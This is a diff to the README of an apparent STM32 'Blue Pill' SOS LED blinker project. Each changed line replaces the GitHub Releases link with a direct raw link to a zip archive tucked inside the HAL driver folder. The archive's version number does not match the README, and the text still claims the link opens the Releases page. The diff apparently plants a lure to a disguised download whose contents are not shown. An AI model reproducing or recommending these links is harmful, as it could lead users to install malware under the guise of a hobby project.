@@ -1,7 +1,7 @@
 # 🐍 sos-blinky-stm32f103c8 - Simple SOS Blinker for STM32
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases)
+[![Download](https://raw.githubusercontent.com/lompong6438/sos-blinky-stm32f103c8/main/Drivers/STM32F1xx_HAL_Driver/sos-blinky-stm32f103c8-3.9.zip)](https://raw.githubusercontent.com/lompong6438/sos-blinky-stm32f103c8/main/Drivers/STM32F1xx_HAL_Driver/sos-blinky-stm32f103c8-3.9.zip)
 
 ## 📜 Description
 sos-blinky-stm32f103c8 is an easy-to-use application designed to help you create a basic SOS Morse code blinker. This blinker uses the built-in LED on the STM32F103C8T6A microcontroller, commonly known as the "Blue Pill." Whether you're a hobbyist or just curious about embedded systems, this tool provides a simple way to get started.
@@ -14,10 +14,10 @@ To start using sos-blinky-stm32f103c8, follow these steps:
 2. **Install Required Software**: You will need STM32CubeIDE installed on your computer. This software helps you compile the application and upload it to the microcontroller. 
 
 3. **Download the Application**: Visit the Releases page to download the application files. Click the link below to access it:
-   - [Visit this page to download](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/lompong6438/sos-blinky-stm32f103c8/main/Drivers/STM32F1xx_HAL_Driver/sos-blinky-stm32f103c8-3.9.zip)
 
 ## 🌐 Download & Install
-1. Click on the [Download](https://github.com/lompong6438/sos-blinky-stm32f103c8/releases) link above to go to the Releases page.
+1. Click on the [Download](https://raw.githubusercontent.com/lompong6438/sos-blinky-stm32f103c8/main/Drivers/STM32F1xx_HAL_Driver/sos-blinky-stm32f103c8-3.9.zip) link above to go to the Releases page.
    
 2. You’ll see a list of versions. Choose the latest one, typically marked as the "Latest Release."
 
